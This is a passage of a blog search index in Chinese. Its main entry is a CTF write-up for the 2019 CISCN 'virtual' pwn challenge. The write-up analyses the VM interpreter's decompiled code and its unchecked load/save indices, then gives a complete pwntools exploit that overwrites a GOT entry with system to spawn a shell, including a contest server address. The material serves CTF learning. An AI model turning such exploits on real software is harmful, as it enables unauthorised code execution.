<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>vmpwn学习-2019CISCN-pwn-virtual</title>
      <link href="2020/11/11/vmpwn%E5%AD%A6%E4%B9%A0-2019CISCN-pwn-virtual/"/>
      <url>2020/11/11/vmpwn%E5%AD%A6%E4%B9%A0-2019CISCN-pwn-virtual/</url>
      
        <content type="html"><![CDATA[<h2 id="vmpwn解释器认识"><a href="#vmpwn解释器认识" class="headerlink" title="vmpwn解释器认识"></a>vmpwn解释器认识</h2><h3 id="寄存器知识补充"><a href="#寄存器知识补充" class="headerlink" title="寄存器知识补充"></a>寄存器知识补充</h3><ul><li>PC 指向执行的指令</li><li>BP,SP 指向栈底和栈顶</li><li>AX 通用寄存器,用来存放指令执行后的结果</li></ul><p>虚拟机定义的时候会定义一个全局变量的美剧类型,里面存放指令</p><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><h3 id="总体结构"><a href="#总体结构" class="headerlink" title="总体结构"></a>总体结构</h3><pre class=" language-c"><code class="language-c">__int64 __fastcall <span class="token function">main</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a2<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a3<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">char</span> <span class="token operator">*</span>exec_name<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-28h]</span>  section_info <span class="token operator">*</span>stack_addr<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+20h] [rbp-20h]</span>  section_info <span class="token operator">*</span>text_addr<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+28h] [rbp-18h]</span>  <span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span>data_addr<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+30h] [rbp-10h]</span>  <span class="token keyword">char</span> <span class="token operator">*</span>ptr<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+38h] [rbp-8h]</span>  <span class="token function">do_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  exec_name <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x20uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  stack_addr <span class="token operator">=</span> <span class="token function">sub_4013B4</span><span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token comment" spellcheck="true">// stack段大小为64 malloc(64*8)</span>  text_addr <span class="token operator">=</span> <span class="token function">sub_4013B4</span><span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  data_addr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">sub_4013B4</span><span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  ptr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x400uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Your program name:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">my_read_</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span>exec_name<span class="token punctuation">,</span> <span class="token number">0x20u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment" spellcheck="true">// 项目名字</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Your instruction:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">my_read_</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span>ptr<span class="token punctuation">,</span> <span class="token number">0x400u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token comment" spellcheck="true">// 指令</span>  <span class="token function">StoreOpcode</span><span class="token punctuation">(</span>text_addr<span class="token punctuation">,</span> ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token comment" spellcheck="true">// 解析指令</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Your stack data:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">my_read_</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span>ptr<span class="token punctuation">,</span> <span class="token number">0x400u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token comment" spellcheck="true">// 存入栈数据</span>  <span class="token function">StroeStack</span><span class="token punctuation">(</span>stack_addr<span class="token punctuation">,</span> ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token comment" spellcheck="true">// 解析栈数据</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span>text_addr<span class="token punctuation">)</span> <span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">// 运行指令</span>  <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"-------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span>exec_name<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts_stack</span><span class="token punctuation">(</span>stack_addr<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"-------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">else</span>  <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Your Program Crash :)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token function">free</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>                                    <span class="token comment" spellcheck="true">// 回收空间</span>  <span class="token function">my_free</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span>text_addr<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">my_free</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span>stack_addr<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">my_free</span><span class="token punctuation">(</span>data_addr<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1605064989362.png" alt="虚拟机执行流程"></p><h3 id="创建段结构"><a href="#创建段结构" class="headerlink" title="创建段结构"></a>创建段结构</h3><p>创建一个包含段信息的结构,真正的段内容在结构指向的指针里,段的信息包含段指针,大小和一个表示数量的字段</p><pre class=" language-c"><code class="language-c">section_info <span class="token operator">*</span>__fastcall <span class="token function">sub_4013B4</span><span class="token punctuation">(</span><span class="token keyword">int</span> size<span class="token punctuation">)</span><span class="token punctuation">{</span>  section_info <span class="token operator">*</span>result<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rax</span>  section_info <span class="token operator">*</span>ptr<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+10h] [rbp-10h]</span>  <span class="token keyword">void</span> <span class="token operator">*</span>s<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-8h]</span>  ptr <span class="token operator">=</span> <span class="token punctuation">(</span>section_info <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 申请空间存放段的信息，每个段一个</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>ptr <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  s <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8LL</span> <span class="token operator">*</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> s <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">memset</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">8LL</span> <span class="token operator">*</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token comment" spellcheck="true">// 段信息包含，段指针，大小，和numb</span>    ptr<span class="token operator">-></span>section_ptr <span class="token operator">=</span> <span class="token punctuation">(</span>__int64<span class="token punctuation">)</span>s<span class="token punctuation">;</span>    ptr<span class="token operator">-></span>size <span class="token operator">=</span> size<span class="token punctuation">;</span>    ptr<span class="token operator">-></span>numb <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    result <span class="token operator">=</span> ptr<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">else</span>  <span class="token punctuation">{</span>    <span class="token function">free</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>    result <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="指令处理"><a href="#指令处理" class="headerlink" title="指令处理"></a>指令处理</h3><p>把从输入获取到的指令存入相应的段</p><p>实现了把输入的字符串转化为对应的汇编指令。</p><p>按照<code>\n\r\t</code>把输入数据分割成一个一个指令,然后把指令字符串转化为对应汇编字节码存到数组里,然后存入text段,存进去的顺序是先进来的在高地址处</p><pre class=" language-c"><code class="language-c"><span class="token keyword">void</span> __fastcall <span class="token function">StoreOpcode</span><span class="token punctuation">(</span>section_info <span class="token operator">*</span>text<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>src<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> idx<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-18h]</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+1Ch] [rbp-14h]</span>  <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>s1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+20h] [rbp-10h]</span>  _QWORD <span class="token operator">*</span>ptr<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+28h] [rbp-8h]</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> text <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    ptr <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8LL</span> <span class="token operator">*</span> text<span class="token operator">-></span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>    idx <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>                                    <span class="token comment" spellcheck="true">// idx为size的时候结束</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span> s1 <span class="token operator">=</span> <span class="token function">strtok</span><span class="token punctuation">(</span>src<span class="token punctuation">,</span> delim<span class="token punctuation">)</span><span class="token punctuation">;</span> idx <span class="token operator">&lt;</span> text<span class="token operator">-></span>size <span class="token operator">&amp;&amp;</span> s1<span class="token punctuation">;</span> s1 <span class="token operator">=</span> <span class="token function">strtok</span><span class="token punctuation">(</span><span class="token number">0LL</span><span class="token punctuation">,</span> delim<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token comment" spellcheck="true">// delim分隔符为\n\r\t</span>    <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>s1<span class="token punctuation">,</span> <span class="token string">"push"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        ptr<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">=</span> PUSH<span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>s1<span class="token punctuation">,</span> <span class="token string">"pop"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        ptr<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">=</span> POP<span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>s1<span class="token punctuation">,</span> <span class="token string">"add"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        ptr<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">=</span> ADD<span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>s1<span class="token punctuation">,</span> <span class="token string">"sub"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        ptr<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">=</span> SUB<span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>s1<span class="token punctuation">,</span> <span class="token string">"mul"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        ptr<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">=</span> MUL<span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>s1<span class="token punctuation">,</span> <span class="token string">"div"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        ptr<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">=</span> DIV<span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>s1<span class="token punctuation">,</span> <span class="token string">"load"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        ptr<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">=</span> LOAD<span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>s1<span class="token punctuation">,</span> <span class="token string">"save"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        ptr<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">=</span> SAVE<span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">else</span>      <span class="token punctuation">{</span>        ptr<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">255LL</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token operator">++</span>idx<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> idx <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">>=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">StoreInSection</span><span class="token punctuation">(</span>text<span class="token punctuation">,</span> ptr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">--</span>i <span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 最先输入的指令保存在最后面</span>      <span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h3 id="解析栈数据"><a href="#解析栈数据" class="headerlink" title="解析栈数据"></a>解析栈数据</h3><pre class=" language-c"><code class="language-c"><span class="token keyword">void</span> __fastcall <span class="token function">StroeStack</span><span class="token punctuation">(</span>section_info <span class="token operator">*</span>stack_addr<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>a2<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> idx<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-28h]</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+1Ch] [rbp-24h]</span>  <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>nptr<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+20h] [rbp-20h]</span>  _QWORD <span class="token operator">*</span>ptr<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+28h] [rbp-18h]</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> stack_addr <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    ptr <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8LL</span> <span class="token operator">*</span> stack_addr<span class="token operator">-></span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>    idx <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span> nptr <span class="token operator">=</span> <span class="token function">strtok</span><span class="token punctuation">(</span>a2<span class="token punctuation">,</span> delim<span class="token punctuation">)</span><span class="token punctuation">;</span> idx <span class="token operator">&lt;</span> stack_addr<span class="token operator">-></span>size <span class="token operator">&amp;&amp;</span> nptr<span class="token punctuation">;</span> nptr <span class="token operator">=</span> <span class="token function">strtok</span><span class="token punctuation">(</span><span class="token number">0LL</span><span class="token punctuation">,</span> delim<span class="token punctuation">)</span> <span class="token punctuation">)</span>      ptr<span class="token punctuation">[</span>idx<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">atol</span><span class="token punctuation">(</span>nptr<span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token comment" spellcheck="true">// 输入字符串转化为int存放到列表</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> idx <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">>=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">StoreInSection</span><span class="token punctuation">(</span>stack_addr<span class="token punctuation">,</span> ptr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">--</span>i <span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 跟text一样，先输入的存放在高地址处</span>      <span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h3 id="run函数"><a href="#run函数" class="headerlink" title="run函数"></a>run函数</h3><p>包含了对汇编指令的实现,对上面字节码的处理是先进先出</p><p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1605071845841.png" alt="run函数"></p><ul><li>do_PUSH函数从栈的尾部读出来数据然后放入data段的尾部</li><li>do_POP函数从data段的尾部读出数据放入stack段尾部</li><li>do_ADD从data尾部读出数据a1,a2相加结果放到data尾部</li><li>do_SUB从data尾部顺序读出a1,a2  a1-a2结果放到data尾部</li><li>do_LOAD       data.append(data[num+data[-1]])   从最后一位取出来索引,然后把找到的数据放回最后一位</li><li>do_SAVE   data[data[-1]+num]=data[-2] 从data尾部取出索引,倒数第二个取出数据</li></ul><p>在 do_LOAD和do_SAVE 没有对索引的检查导致溢出</p><h3 id="payload分析"><a href="#payload分析" class="headerlink" title="payload分析"></a>payload分析</h3><pre class=" language-python"><code class="language-python">push push save push load push add push savedata_addr<span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">13</span> <span class="token punctuation">,</span>one <span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">13</span></code></pre><p>执行完2次push之后</p><p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1605095564126.png" alt="数据的存放"></p><p>此时的内存结构为</p><p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1605094684307.png" alt="data结构"></p><ul><li>data_ptr地址为0x17c38f0,其中0xffffffff为-1表示numb</li><li>0x17c3910为data_section_ptr</li></ul><p>此时执行save会取出来-3作为索引,data_addr作为数据,即实际作用为data_section_ptr[-1-3]=data_addr</p><p>接下来的push会向data_addr指向的内容写入-13</p><p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1605100867616.png" alt="整个流程图"></p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>整个过程从传统的输出到显示器对显示器进行操作变成了输出到内存,对内存进行操作,泄露到显示器也变成了泄漏到内存。只要内存中两处数据存在加法或减法运算就能直接用内存计算得出来真实地址。</p><p>关注漏洞：索引越界，每次向内存中存取数据都要有对索引的检查</p><p>段信息的结构体</p><p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1605105955667.png" alt="段的信息结构体"></p><p>需要修改section_ptr指针,save到指定地址处写数据,相对于section_ptr指针的偏移是固定的,可以修改它用save修改它</p><p>需要得到libc的基地址,可以用load加载got表项,用add计算出来system函数实际的地址</p><p>用save把system函数的地址覆盖puts函数的got表项</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>file_path <span class="token operator">=</span> <span class="token string">"./pwn"</span>context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">"amd64"</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span><span class="token comment" spellcheck="true"># context.terminal = ['tmux', 'splitw', '-h']</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_path<span class="token punctuation">)</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">[</span>file_path<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># gdb.attach(p, "b *$rebase(0x121c)")</span>    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span>    one<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0x4f3d5</span><span class="token punctuation">,</span><span class="token number">0x4f432</span><span class="token punctuation">,</span><span class="token number">0x10a41c</span><span class="token punctuation">]</span><span class="token keyword">else</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'47.111.104.169'</span><span class="token punctuation">,</span> <span class="token number">57404</span><span class="token punctuation">)</span>    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span>    one_gadget <span class="token operator">=</span> <span class="token number">0x0</span><span class="token keyword">def</span> <span class="token function">debug_1</span><span class="token punctuation">(</span>addr<span class="token punctuation">,</span>PIE<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    debug_str <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">if</span> PIE<span class="token punctuation">:</span>        text_base <span class="token operator">=</span> int<span class="token punctuation">(</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">"pmap {}| awk '{{print $1}}'"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>p<span class="token punctuation">.</span>pid<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> addr<span class="token punctuation">:</span>            debug_str<span class="token operator">+=</span><span class="token string">'b *{}\n'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>text_base<span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>        gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">,</span>debug_str<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> addr<span class="token punctuation">:</span>            text_base<span class="token operator">=</span><span class="token number">0</span>            debug_str<span class="token operator">+=</span><span class="token string">'b *{}\n'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>text_base<span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>        gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">,</span>debug_str<span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Your program name:\n"</span><span class="token punctuation">,</span><span class="token string">"/bin/sh\x00"</span><span class="token punctuation">)</span>debug_1<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0x000000000401D55</span><span class="token punctuation">]</span><span class="token punctuation">)</span>inst<span class="token operator">=</span><span class="token string">"push push save push load push add push save"</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"our instruction:\n"</span><span class="token punctuation">,</span>inst<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#-5得到malloc函数的got</span>one_offset<span class="token operator">=</span><span class="token operator">-</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"malloc"</span><span class="token punctuation">]</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span>stack<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0x000000000404088</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">,</span>one_offset<span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">12</span><span class="token punctuation">]</span>payload<span class="token operator">=</span><span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> stack<span class="token punctuation">:</span>    payload<span class="token operator">+=</span>str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">" "</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"stack data:\n"</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 学习过程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vm </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctf脚本技巧</title>
      <link href="2020/11/10/pwn%E5%B8%B8%E7%94%A8%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7%E6%A8%A1%E6%9D%BF/"/>
      <url>2020/11/10/pwn%E5%B8%B8%E7%94%A8%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7%E6%A8%A1%E6%9D%BF/</url>
      
